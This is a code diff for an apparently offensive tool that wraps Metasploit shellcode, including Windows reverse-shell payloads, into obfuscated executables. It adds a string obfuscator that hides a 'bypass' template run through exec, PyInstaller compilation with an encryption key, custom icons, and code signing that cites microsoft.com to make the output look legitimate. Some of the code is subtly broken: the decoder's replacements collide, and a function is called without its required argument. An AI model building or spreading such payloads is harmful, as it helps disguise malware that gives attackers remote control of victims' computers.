@@ -7,6 +7,7 @@ import os
 import shutil
 from colorama import Fore
 import platform
+import inspect
 
 def banner():
     print(f'''{Fore.RED}
@@ -38,8 +39,75 @@ def payloadlist():
     windows/x64/shell/reverse_tcp
     windows/shell/reverse_tcp
 ''')
+    
 
-def shellcode():
+def obfenc(obfstr):
+    obfstr = obfstr.replace('a', 'v0.').replace('b', 'v01.').replace('c', 'v10.').replace('d', 'v02.').replace('e', 'v03.').replace('f', 'v20.').replace('g', 'v30.').replace('h', 'v04.').replace('i', 'v40.').replace('j', 'v05.').replace('k', 'v50.').replace('l', 'v06.').replace('m', 'v60.').replace('n', 'v07.').replace('o', 'v70.').replace('p', 'v08.').replace('q', 'v80.').replace('r', 'v90.').replace('s', 'v09.').replace('t', 'v11.').replace('u', 'v12.').replace('v', 'v13.').replace('w', 'v14.').replace('x', 'v15.').replace('y', 'v16.').replace('z', 'v17.')
+    return obfstr
+
+def obfdec(obfstr):
+    obfstr = obfstr.replace('v0.', 'a').replace('v01.', 'b').replace('v10.', 'c').replace('v02.', 'd').replace('v03.', 'e').replace('v20.', 'f').replace('v30.', 'g').replace('v04.', 'h').replace('v40.', 'i').replace('v05.', 'j').replace('v50.', 'k').replace('v06.', 'l').replace('v60.', 'm').replace('v07.', 'n').replace('v70.', 'o').replace('v08.', 'p').replace('v80.', 'q').replace('v90.', 'r').replace('v09.', 's').replace('v11.', 't').replace('v12.', 'u').replace('v13.', 'v').replace('v14.', 'w').replace('v15.', 'x').replace('v16.', 'y').replace('v17.', 'z')
+    obfstr = obfstr.replace('v0.', 'a').replace('v01.', 'b').replace('v10.', 'c').replace('v02.', 'd').replace('v03.', 'e').replace('v20.', 'f').replace('v30.', 'g').replace('v04.', 'h').replace('v40.', 'i').replace('v05.', 'j').replace('v50.', 'k').replace('v06.', 'l').replace('v60.', 'm').replace('v07.', 'n').replace('v70.', 'o').replace('v08.', 'p').replace('v80.', 'q').replace('v90.', 'r').replace('v09.', 's').replace('v11.', 't').replace('v12.', 'u').replace('v13.', 'v').replace('v14.', 'w').replace('v15.', 'x').replace('v16.', 'y').replace('v17.', 'z')
+    return obfstr
+
+class Condor(object):
+    def __init__(self, shellcode_file, icon, output_file):
+        self.shellcode_file = shellcode_file
+        self.icon = icon
+        self.icon_path = None
+        self.key = randchar(64)
+        self.determine_ico_path()
+        self.output_file = output_file
+        if self.output_file is None:
+            self.output_file = randchar(6) + ".exe"
+        filename = os.path.basename(self.output_file)
+        self.output_name = os.path.splitext(filename)[0]
+
+    def determine_ico_path(self):
+        if os.path.exists(self.icon):
+            self.icon_path = self.icon
+        else:
+            dir_path = os.path.dirname(os.path.realpath(__file__))
+            self.icon_path = os.path.join(dir_path, "icons", self.icon)
+
+    def obfuscate_python_payload(self):
+        shellcode_f = open(self.shellcode_file, 'r').read()
+        dir_path = os.path.dirname(os.path.realpath(__file__))
+        template_path = os.path.join(dir_path, "template/bypass.py")
+        template_f = open(template_path, 'r').read()
+
+        payload_path = os.path.join(dir_path, f"workbench/{self.output_name}.py")
+        py_f = open(payload_path, 'a')
+        py_f.write(shellcode_f)
+        obftmp = obfenc(template_f)
+        #print(template_f)
+        obfuscated_template = "\n" + inspect.getsource(obfdec) + f"""
+        
+    template = '''{obftmp}'''
+    exec(obfdec(template))"""
+        py_f.write(obfuscated_template)
+        py_f.close()
+        template_f.close()
+        shellcode_f.close()
+
+    def linux_compile(self):
+        os.system(f'wine "/opt/wineprefix/drive_c/Python310/Scripts/pyinstaller.exe" --onefile --noconsole --distpath {os.getcwd()}/ -i "{self.icon_path}" -n "{self.output_name}" --key={self.key} {os.getcwd()}/workbench/{self.output_name}.py')
+
+    def cleanup_trash(self):
+        os.remove(f'{self.output_name}.spec')
+        shutil.rmtree('build')
+        os.remove('workbench/shellcode.py')
+        os.remove(f'workbench/{self.output_name}.py')
+
+    def sign_payload(self):
+        not_signed_file = f"{self.output_name}-not-signed.exe"
+        shutil.move(self.output_file, f"{self.output_name}-not-signed.exe")
+        os.system(f'osslsigncode sign -certs certificate/cert.pem -key certificate/cert.key -n "TODO" -i https://microsoft.com/ -in "{not_signed_file}" -out "{self.output_file}" ')
+
+
+    
+
+def generate_shellcode(arguments):
     if arguments.payload == 'windows/x64/exec':
         cmd = input(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Put the command: ')
         print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
@@ -252,7 +320,7 @@ def signexe(exename):
         exename = 'Command Prompt'
     subprocess.call(f'mv "{exename}.exe" "{exename}-not-signed.exe";osslsigncode sign -certs certificate/cert.pem -key certificate/cert.key -n "{exename}" -i https://microsoft.com/ -in "{exename}-not-signed.exe" -out "{exename}.exe";rm "{exename}-not-signed.exe"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-def main():
+def main(arguments):
     key = randchar(64)
     exerandname = randchar(6)
     banner()
@@ -266,7 +334,7 @@ def main():
         quit()
 
     if arguments.icon:
-        shellcode()
+        generate_shellcode()
         exeprotection(exerandname)
         print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode shield created!')
         current_system = platform.system()
@@ -290,7 +358,7 @@ def main():
             print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} The script has been generated, it is in workbench/{exerandname}.py')
             print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Upload to a Windows environment and compile a script using pyinstaller:\npyinstaller.exe --onefile --noconsole --distpath . -n "{exerandname}" --key={key} {exerandname}.py')
     else:
-        shellcode()
+        generate_shellcode()
         exeprotection(exerandname)
         print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode shield created!')
         current_system = platform.system()
@@ -322,6 +390,7 @@ if __name__ == '__main__':
     parser.add_argument('-pl', '--payload-list', action='store_true', help='payload list', dest='payloadlist', required=False)
     parser.add_argument('-i', '--icon', action='store', help='icon of exe', dest='icon', required=False)
     parser.add_argument('-il', '--icon-list', action='store_true', help='icons list', dest='iconslist', required=False)
-    parser.add_argument('-c', '--custom', action='store_true', help='custom msfvenom payload', dest='custompayload', required=False)
+    parser.add_argument('-sc', '--shellcode', help='custom shellcode payload', dest='shellcode', required=False)
+    parser.add_argument('-o', '--output', help='Output file', dest='output', required=False)
     arguments = parser.parse_args()
-    main()
+    main(arguments)
